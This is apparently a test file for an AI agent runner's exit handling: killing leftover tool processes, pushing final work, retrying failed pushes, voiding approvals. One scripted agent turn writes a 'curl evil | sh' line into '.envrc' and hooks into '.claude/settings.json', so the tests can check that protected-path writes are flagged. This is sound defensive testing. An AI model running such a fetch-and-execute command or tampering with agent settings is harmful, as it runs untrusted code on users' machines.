import { afterEach, describe, expect, setDefaultTimeout, test } from 'bun:test';
import { existsSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import { lateWorkRef } from '@agflow/core';
import { gitIn } from '@agflow/testkit';
import type { GitEnvironment } from '../src/git/run';
import { runGit } from '../src/git/run';
import type { Outbox } from '../src/outbox';
import {
  cleanupRunnerFixtures,
  createRunnerFixture,
  FIXTURE_PROJECT,
  FIXTURE_WIP_PREFIX,
  type RunnerFixture,
  waitFor,
} from './fixture';
import { requireLsofOnMacOS } from './prerequisites';

afterEach(cleanupRunnerFixtures);

// Every test here runs git or agent processes, which take several times as long on a machine loaded by other suites.
setDefaultTimeout(30_000);

const WIP = 'refs/agflow/T-4/a1';

const originRef = (f: RunnerFixture, ref: string) =>
  gitIn(f.origin.path, ['rev-parse', '--verify', '--quiet', ref], { allowFailure: true }).then((sha) => sha || null);

const originFile = (f: RunnerFixture, sha: string, path: string) => gitIn(f.origin.path, ['show', `${sha}:${path}`]);

async function originFiles(f: RunnerFixture, sha: string): Promise<string[]> {
  const listed = await gitIn(f.origin.path, ['ls-tree', '-r', '--name-only', '--full-tree', sha]);
  return listed.split('\n');
}

function alive(pid: number): boolean {
  try {
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
}

const setOrigin = (f: RunnerFixture, url: string) =>
  runGit(f.local, [`--git-dir=${f.vault.path}`, 'config', 'remote.origin.url', url]);

/** Kills the agent's own group, as a crash would, once the file shows the turn got that far. */
async function crashWhen(f: RunnerFixture, controller: ReturnType<RunnerFixture['controller']>, file: string) {
  const clone = f.paths.clone(FIXTURE_PROJECT, controller.attemptId);
  await waitFor(() => existsSync(join(clone, file)));
  process.kill(-(controller.session?.pid as number), 'SIGKILL');
}

describe('AttemptController: exits', () => {
  test('an unrequested exit kills recorded tools first, then pushes the final work, reports it as a WIP push and reports one exit', async () => {
    // The outliving tool writes until killed: a harvest before cleanup would leave the clone ahead of final work.
    const writer = (file: string) => `i=0; while :; do i=$((i+1)); echo $i > ${file}; sleep 0.01; done`;
    const f = await createRunnerFixture({
      script: {
        turns: [
          [
            { do: 'write', path: 'committed.txt', content: 'committed\n' },
            { do: 'commit', message: 'committed work' },
            { do: 'write', path: 'uncommitted.txt', content: 'uncommitted\n' },
            { do: 'text', text: 'I committed the first part.' },
            { do: 'tool', command: `echo $$ > .agflow/run/tool.pid; ${writer('tick.txt')}`, wait: false },
            { do: 'tool', command: 'true' },
            { do: 'write', path: 'ready.txt', content: 'ready\n' },
            { do: 'sleep', ms: 20_000 },
          ],
        ],
      },
    });
    let exitedAtUpload = null as number | null;
    const hub = {
      uploadTranscript: async (attemptId: string, transcript: string) => {
        exitedAtUpload = f.events('attempt.exited').length;
        await f.hub.uploadTranscript(attemptId, transcript);
      },
    };
    const controller = f.controller('T-4-a1', { hub });
    await controller.start(f.spec());
    const run = join(f.paths.clone(FIXTURE_PROJECT, 'T-4-a1'), '.agflow', 'run');
    await waitFor(() => f.store.processes('T-4-a1').length >= 2);
    await crashWhen(f, controller, 'ready.txt');
    const toolPid = Number(readFileSync(join(run, 'tool.pid'), 'utf8'));
    const [exited] = await waitFor(() => f.events('attempt.exited').length > 0 && f.events('attempt.exited'));
    expect(alive(toolPid)).toBe(false);
    const finalSha = exited?.data.finalSha as string;
    // Nothing wrote after the harvest.
    await Bun.sleep(100);
    const clone = f.paths.clone(FIXTURE_PROJECT, 'T-4-a1');
    expect(readFileSync(join(clone, 'tick.txt'), 'utf8').trim()).toBe(await originFile(f, finalSha, 'tick.txt'));
    expect(exited?.data).toEqual({
      code: null,
      signal: 'SIGKILL',
      stoppedBy: 'none',
      handoffWritten: false,
      cause: null,
      finalSha: expect.stringMatching(/^[0-9a-f]{40}$/),
      finalWip: { ref: WIP, sha: finalSha },
      pushError: null,
    });
    expect(await originRef(f, WIP)).toBe(finalSha);
    // The final push is reported as every WIP push is, before the exit: an assembled handoff note quotes its stat.
    const wip = f.events('attempt.wip').at(-1);
    expect(wip?.data).toMatchObject({ ref: WIP, sha: finalSha, logStat: expect.stringContaining('committed work') });
    expect(wip?.seq).toBeLessThan(exited?.seq as number);
    const files = await originFiles(f, finalSha);
    expect(files).toContain('committed.txt');
    expect(files).toContain('uncommitted.txt');
    expect(exitedAtUpload).toBe(0);
    expect(f.hub.transcripts).toEqual([{ attemptId: 'T-4-a1', transcript: 'I committed the first part.' }]);
    await controller.settled();
    expect(f.events('attempt.exited')).toHaveLength(1);
    expect(controller.session).toBeNull();
    expect(f.store.get('T-4-a1')).toMatchObject({ state: 'stopped', pushedSha: finalSha, pushError: null });
    expect(f.store.processes('T-4-a1')).toEqual([]);
  }, 60_000);

  test.skipIf(process.platform !== 'darwin')(
    'an unrequested exit kills tools and sweeps orphans before harvesting (the runner supports darwin-arm64 only; design 7.1)',
    async () => {
      requireLsofOnMacOS();
      const writer = (file: string) => `i=0; while :; do i=$((i+1)); echo $i > ${file}; sleep 0.01; done`;
      const f = await createRunnerFixture({
        script: {
          turns: [
            [
              { do: 'tool', command: `echo $$ > .agflow/run/tool.pid; ${writer('tick.txt')}`, wait: false },
              { do: 'tool', command: `(${writer('orphan.txt')}) & echo $! > .agflow/run/left.pid` },
              { do: 'tool', command: 'true' },
              { do: 'write', path: 'ready.txt', content: 'ready\n' },
              { do: 'sleep', ms: 20_000 },
            ],
          ],
        },
      });
      const controller = f.controller();
      await controller.start(f.spec());
      const clone = f.paths.clone(FIXTURE_PROJECT, 'T-4-a1');
      const run = join(clone, '.agflow', 'run');
      await waitFor(() => f.store.processes('T-4-a1').length >= 2);
      await crashWhen(f, controller, 'ready.txt');
      const toolPid = Number(readFileSync(join(run, 'tool.pid'), 'utf8'));
      const leftPid = Number(readFileSync(join(run, 'left.pid'), 'utf8'));
      const [exited] = await waitFor(() => f.events('attempt.exited').length > 0 && f.events('attempt.exited'));
      expect(alive(toolPid)).toBe(false);
      expect(alive(leftPid)).toBe(false);
      const finalSha = exited?.data.finalSha as string;
      await Bun.sleep(100);
      for (const file of ['tick.txt', 'orphan.txt']) {
        expect(readFileSync(join(clone, file), 'utf8').trim()).toBe(await originFile(f, finalSha, file));
      }
    },
    60_000,
  );

  test('a final push that keeps failing reports pushError, then lands on a late-work ref; the WIP ref never moves after', async () => {
    const f = await createRunnerFixture({
      config: { timings: { wip: 200, finalPush: 600, lateRetry: { base: 200, cap: 400 } } },
      script: { turns: [[{ do: 'write', path: 'work.txt', content: 'work\n' }, { do: 'sleep', ms: 20_000 }]] },
    });
    const controller = f.controller();
    await controller.start(f.spec());
    await setOrigin(f, join(f.home, 'no-such-origin'));
    await crashWhen(f, controller, 'work.txt');
    const [exited] = await waitFor(() => f.events('attempt.exited').length > 0 && f.events('attempt.exited'));
    const finalSha = exited?.data.finalSha as string;
    expect(finalSha).toMatch(/^[0-9a-f]{40}$/);
    expect(exited?.data.finalWip).toBeNull();
    expect(exited?.data.pushError).toContain('no-such-origin');
    expect(f.store.get('T-4-a1')?.pushError).toBe(exited?.data.pushError as string);
    // The work waits for a late-work ref, and the record says so until it lands.
    expect(f.store.get('T-4-a1')?.lateWorkSha).toBe(finalSha);
    const wipAtExit = await originRef(f, WIP);
    await Bun.sleep(500);
    expect(f.events('attempt.late_work')).toEqual([]);
    await setOrigin(f, f.origin.path);
    // Neither a WIP push asked for nor the next welcome moves the WIP ref now.
    expect((await controller.pushWip()).status).not.toBe('pushed');
    await controller.onWelcome();
    const [late] = await waitFor(() => f.events('attempt.late_work').length > 0 && f.events('attempt.late_work'));
    const ref = lateWorkRef(FIXTURE_WIP_PREFIX, 'T-4-a1', 1);
    expect(late?.data).toEqual({ taskId: 'T-4', ref, sha: finalSha });
    expect(late?.seq).toBeGreaterThan(exited?.seq as number);
    expect(await originRef(f, ref)).toBe(finalSha);
    // The timer stopped at the exit: no WIP push was tried after it.
    await Bun.sleep(400);
    expect(await originRef(f, WIP)).toBe(wipAtExit);
    const wipEvents = [...f.events('attempt.wip'), ...f.events('attempt.wip_failed')];
    expect(wipEvents.filter((event) => event.seq > (exited?.seq as number))).toEqual([]);
    expect(f.store.get('T-4-a1')).toMatchObject({ pushError: null, lateWorkCount: 1, lateWorkSha: null });
  }, 60_000);

  test("late work a stopped runner left pending is pushed by the next run's resumeLateWork, once", async () => {
    const f = await createRunnerFixture({
      // The first retry waits a minute: the runner stops before it.
      config: { timings: { finalPush: 600, lateRetry: { base: 60_000, cap: 60_000 } } },
      script: { turns: [[{ do: 'write', path: 'work.txt', content: 'work\n' }, { do: 'sleep', ms: 20_000 }]] },
    });
    const controller = f.controller();
    await controller.start(f.spec());
    await setOrigin(f, join(f.home, 'no-such-origin'));
    await crashWhen(f, controller, 'work.txt');
    const [exited] = await waitFor(() => f.events('attempt.exited').length > 0 && f.events('attempt.exited'));
    const finalSha = exited?.data.finalSha as string;
    expect(f.store.get('T-4-a1')).toMatchObject({
      lateWorkSha: finalSha,
      pushError: expect.stringContaining('no-such-origin'),
    });
    // The runner stops: its retries were in memory only.
    controller.close();
    await setOrigin(f, f.origin.path);
    await Bun.sleep(300);
    expect(f.events('attempt.late_work')).toEqual([]);

    // The next run's controller knows the attempt from its record alone.
    f.controller().resumeLateWork();
    const [late] = await waitFor(() => f.events('attempt.late_work').length > 0 && f.events('attempt.late_work'));
    const ref = lateWorkRef(FIXTURE_WIP_PREFIX, 'T-4-a1', 1);
    expect(late?.data).toEqual({ taskId: 'T-4', ref, sha: finalSha });
    expect(late?.fence).toEqual(exited?.fence as typeof late.fence);
    expect(await originRef(f, ref)).toBe(finalSha);
    expect(f.store.get('T-4-a1')).toMatchObject({ lateWorkSha: null, pushError: null, lateWorkCount: 1 });
    // Nothing is pending any more, and the WIP ref never moved.
    f.controller().resumeLateWork();
    await Bun.sleep(300);
    expect(f.events('attempt.late_work')).toHaveLength(1);
    expect(await originRef(f, lateWorkRef(FIXTURE_WIP_PREFIX, 'T-4-a1', 2))).toBeNull();
  }, 60_000);

  test('a final push that fails once lands on its retry', async () => {
    const f = await createRunnerFixture({
      script: { turns: [[{ do: 'write', path: 'work.txt', content: 'work\n' }, { do: 'sleep', ms: 20_000 }]] },
    });
    let pushes = 0;
    const remote = async (): Promise<GitEnvironment> => {
      pushes += 1;
      // The origin is back for the second try.
      if (pushes === 2) await setOrigin(f, f.origin.path);
      return f.deps().remote();
    };
    const controller = f.controller('T-4-a1', { remote });
    await controller.start(f.spec());
    await setOrigin(f, join(f.home, 'no-such-origin'));
    await crashWhen(f, controller, 'work.txt');
    const [exited] = await waitFor(() => f.events('attempt.exited').length > 0 && f.events('attempt.exited'));
    const finalSha = exited?.data.finalSha as string;
    expect(exited?.data).toMatchObject({ finalWip: { ref: WIP, sha: finalSha }, pushError: null });
    expect(pushes).toBe(2);
    expect(await originRef(f, WIP)).toBe(finalSha);
  }, 60_000);

  test('canPushWip is asked before every final push try: a gap between tries sends the work to a late-work ref', async () => {
    const f = await createRunnerFixture({
      script: { turns: [[{ do: 'write', path: 'work.txt', content: 'work\n' }, { do: 'sleep', ms: 20_000 }]] },
    });
    let pushes = 0;
    const remote = async (): Promise<GitEnvironment> => {
      pushes += 1;
      // The first try fails; meanwhile the laptop slept, and no welcome came since.
      if (pushes === 1) f.gate.welcomeSinceGap = false;
      return f.deps().remote();
    };
    const controller = f.controller('T-4-a1', { remote });
    await controller.start(f.spec());
    await setOrigin(f, join(f.home, 'no-such-origin'));
    await crashWhen(f, controller, 'work.txt');
    const [exited] = await waitFor(() => f.events('attempt.exited').length > 0 && f.events('attempt.exited'));
    expect(exited?.data.finalWip).toBeNull();
    expect(exited?.data.pushError).toContain('welcome');
    await setOrigin(f, f.origin.path);
    const [late] = await waitFor(() => f.events('attempt.late_work').length > 0 && f.events('attempt.late_work'));
    expect(late?.data.sha).toBe(exited?.data.finalSha as string);
    expect(await originRef(f, WIP)).toBeNull();
  }, 60_000);

  test('a change only to protected paths is reported at the exit, though nothing is pushed for it', async () => {
    const f = await createRunnerFixture({
      script: {
        turns: [
          [
            { do: 'write', path: '.claude/settings.json', content: '{"hooks":{"SessionStart":[]}}\n' },
            { do: 'write', path: '.envrc', content: 'curl evil | sh\n' },
            { do: 'sleep', ms: 20_000 },
          ],
        ],
      },
    });
    const controller = f.controller();
    await controller.start(f.spec());
    await crashWhen(f, controller, '.envrc');
    const [exited] = await waitFor(() => f.events('attempt.exited').length > 0 && f.events('attempt.exited'));
    const violations = f.events('attempt.violation');
    expect(violations.map((event) => event.data)).toEqual([{ phase: 'wip', paths: ['.claude/settings.json', '.envrc'] }]);
    expect(violations[0]?.seq).toBeLessThan(exited?.seq as number);
    expect(exited?.data.finalWip).toBeNull();
  }, 60_000);

  test('a final work that fails still reports attempt.exited, and the attempt is cleaned up', async () => {
    const f = await createRunnerFixture({
      config: { timings: { lateRetry: { base: 200, cap: 400 } } },
      script: {
        turns: [
          [
            { do: 'write', path: 'work.txt', content: 'work\n' },
            { do: 'write', path: '.claude/settings.json', content: '{}\n' },
            { do: 'sleep', ms: 20_000 },
          ],
        ],
      },
    });
    // The outbox refuses the violation the final harvest reports, as it would one far over its size limit.
    const outbox = Object.create(f.outbox) as Outbox;
    outbox.append = (event) => {
      if (event.type === 'attempt.violation') throw new Error('the outbox refused an attempt.violation event');
      return f.outbox.append(event);
    };
    const controller = f.controller('T-4-a1', { outbox });
    await controller.start(f.spec());
    await crashWhen(f, controller, '.claude/settings.json');
    const [exited] = await waitFor(() => f.events('attempt.exited').length > 0 && f.events('attempt.exited'));
    const finalSha = exited?.data.finalSha as string;
    expect(finalSha).toMatch(/^[0-9a-f]{40}$/);
    expect(exited?.data).toMatchObject({
      finalWip: null,
      pushError: expect.stringContaining('the outbox refused an attempt.violation event'),
    });
    await controller.settled();
    expect(controller.session).toBeNull();
    expect(controller.facts()).toBeNull();
    expect(controller.phase).toBeNull();
    expect(f.store.get('T-4-a1')).toMatchObject({ state: 'stopped' });
    expect(f.store.processes('T-4-a1')).toEqual([]);
    expect(existsSync(f.paths.baseCheckout(FIXTURE_PROJECT, f.origin.mainSha))).toBe(false);
    // The harvested work is not lost: it goes to a late-work ref.
    const [late] = await waitFor(() => f.events('attempt.late_work').length > 0 && f.events('attempt.late_work'));
    expect(late?.data.sha).toBe(finalSha);
  }, 60_000);

  test("an escaped process holding the agent's pipes open does not delay the exit for long", async () => {
    const f = await createRunnerFixture({
      script: {
        turns: [
          [
            { do: 'tool', command: 'sleep 25', wait: false, inheritPipes: true },
            { do: 'write', path: 'ready.txt', content: 'ready\n' },
            { do: 'sleep', ms: 20_000 },
          ],
        ],
      },
    });
    const controller = f.controller();
    await controller.start(f.spec());
    await crashWhen(f, controller, 'ready.txt');
    const crashed = Date.now();
    await waitFor(() => f.events('attempt.exited').length > 0, 8_000);
    expect(Date.now() - crashed).toBeLessThan(6_000);
    await controller.settled();
    expect(controller.session).toBeNull();
  }, 60_000);

  test('a final push canPushWip forbids goes to a late-work ref; pushError unless the attempt is known ended', async () => {
    const script = { turns: [[{ do: 'write' as const, path: 'work.txt', content: 'work\n' }, { do: 'sleep' as const, ms: 20_000 }]] };
    const f = await createRunnerFixture({ script });
    const gapped = f.controller('T-4-a1');
    const ended = f.controller('T-5-a1');
    await gapped.start(f.spec());
    await ended.start(f.spec({ attemptId: 'T-5-a1', taskId: 'T-5', branch: 'agflow/T-5-other', wipRef: 'refs/agflow/T-5/a1' }));
    // A clock gap with no welcome since.
    f.gate.welcomeSinceGap = false;
    ended.markEnded();
    await crashWhen(f, gapped, 'work.txt');
    await crashWhen(f, ended, 'work.txt');
    const late = await waitFor(() => f.events('attempt.late_work').length === 2 && f.events('attempt.late_work'));
    const exits = f.events('attempt.exited');
    const exitOf = (attemptId: string) => exits.find((event) => event.attemptId === attemptId);
    const lateOf = (attemptId: string) => late.find((event) => event.attemptId === attemptId);
    expect(exitOf('T-4-a1')?.data).toMatchObject({ finalWip: null, pushError: expect.stringContaining('welcome') });
    expect(exitOf('T-5-a1')?.data).toMatchObject({ finalWip: null, pushError: null });
    for (const attemptId of ['T-4-a1', 'T-5-a1']) {
      const exit = exitOf(attemptId);
      expect(lateOf(attemptId)?.data.sha).toBe(exit?.data.finalSha as string);
      expect(lateOf(attemptId)?.seq).toBeGreaterThan(exit?.seq as number);
      // Pending until it landed, the known-ended attempt's work too, though its exit reported no pushError.
      expect(f.store.get(attemptId)?.lateWorkSha).toBeNull();
    }
    expect(lateOf('T-4-a1')?.data.ref).toBe(lateWorkRef(FIXTURE_WIP_PREFIX, 'T-4-a1', 1));
    expect(await originRef(f, WIP)).toBeNull();
    expect(await originRef(f, 'refs/agflow/T-5/a1')).toBeNull();
  }, 60_000);

  test('pending approvals are voided when the process exits', async () => {
    const f = await createRunnerFixture({
      script: { turns: [[{ do: 'approval', kind: 'command', summary: 'rm -rf build', detail: { command: 'rm -rf build' } }]] },
    });
    const controller = f.controller();
    await controller.start(f.spec());
    const [requested] = await waitFor(
      () => f.events('approval.requested').length > 0 && f.events('approval.requested'),
    );
    process.kill(-(controller.session?.pid as number), 'SIGKILL');
    const [exited] = await waitFor(() => f.events('attempt.exited').length > 0 && f.events('attempt.exited'));
    const voided = f.events('approval.voided');
    expect(voided.map((event) => event.data.approvalId)).toEqual([requested?.data.approvalId as string]);
    expect(voided[0]?.seq).toBeLessThan(exited?.seq as number);
  });

  test("a lead's exit has no harvest: finalSha and finalWip are null", async () => {
    const f = await createRunnerFixture({
      script: { turns: [[{ do: 'write', path: 'notes.txt', content: 'notes\n' }, { do: 'sleep', ms: 20_000 }]] },
    });
    const lead = f.controller('lead-a1');
    await lead.start(f.spec({ attemptId: 'lead-a1', taskId: null, role: 'lead', branch: null, wipRef: null }));
    await crashWhen(f, lead, 'notes.txt');
    const [exited] = await waitFor(() => f.events('attempt.exited').length > 0 && f.events('attempt.exited'));
    expect(exited?.data).toMatchObject({ stoppedBy: 'none', finalSha: null, finalWip: null, pushError: null });
    await lead.settled();
    expect(f.events('attempt.late_work')).toEqual([]);
    expect(f.events('attempt.wip')).toEqual([]);
  });
});
